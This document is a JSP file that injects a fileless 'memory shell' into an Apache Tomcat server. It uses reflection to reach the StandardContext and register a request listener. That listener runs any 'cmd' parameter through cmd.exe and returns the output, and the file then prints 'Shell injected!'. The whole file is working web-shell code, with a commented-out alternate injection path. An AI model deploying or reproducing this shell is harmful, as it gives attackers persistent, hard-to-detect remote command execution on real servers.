<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="javax.servlet.http.HttpServletResponse" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="javax.servlet.ServletRequestListener" %>
<%@ page import="javax.servlet.ServletRequestEvent" %>
<%@ page import="javax.servlet.ServletContext" %>
<%@ page import="javax.servlet.ServletRequest" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="javax.servlet.ServletOutputStream" %>
<%--<%@ page import="org.apache.catalina.core.ApplicationContextFacade" %>--%>

<%
    class S implements ServletRequestListener {
        HttpServletResponse httpServletResponse;

        public S(HttpServletResponse httpServletResponse) {
            this.httpServletResponse = httpServletResponse;
        }
        @Override
        public void requestDestroyed(ServletRequestEvent servletRequestEvent) {

        }
        @Override
        public void requestInitialized(ServletRequestEvent servletRequestEvent) {
            try{
                ServletRequest request = servletRequestEvent.getServletRequest();

                if(request.getParameter("cmd") != null){
                    Process ps = Runtime.getRuntime().exec("cmd.exe /c " + request.getParameter("cmd"));
                    BufferedReader br = new BufferedReader(new InputStreamReader(ps.getInputStream()));
                    ServletOutputStream out = this.httpServletResponse.getOutputStream();

                    String s = null;
                    String output = "";
                    while((s = br.readLine()) != null){
                        output += s + "\n";
                    }
                    out.println(output);
                    out.flush();
                    out.close();
                }
            }catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
%>

<%--<%--%>
<%--    ServletContext servletCtx = (ServletContext) request.getServletContext();--%>
<%--    ApplicationContextFacade appCtxFacade = (ApplicationContextFacade)servletCtx;--%>
<%--    Field appCtxFacadeField = ApplicationContextFacade.class.getDeclaredField("context");--%>
<%--    appCtxFacadeField.setAccessible(true);--%>
<%--    ApplicationContext appCtx = (ApplicationContext) appCtxFacadeField.get(appCtxFacade);--%>
<%--    Field appCtxField = ApplicationContext.class.getDeclaredField("context");--%>
<%--    appCtxField.setAccessible(true);--%>
<%--    StandardContext standardContext = (StandardContext) appCtxField.get(appCtx);--%>

<%--    standardContext.addApplicationEventListener(new S((HttpServletResponse) response));--%>

<%--    response.getWriter().println("Shell injected!");--%>
<%--%>--%>


<%
    ServletContext servletContext = (ServletContext) request.getSession().getServletContext();
    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
    S servletRequestListener = new S((HttpServletResponse) response);
    standardContext.addApplicationEventListener(servletRequestListener);

    response.getWriter().println("Shell injected!");
%>
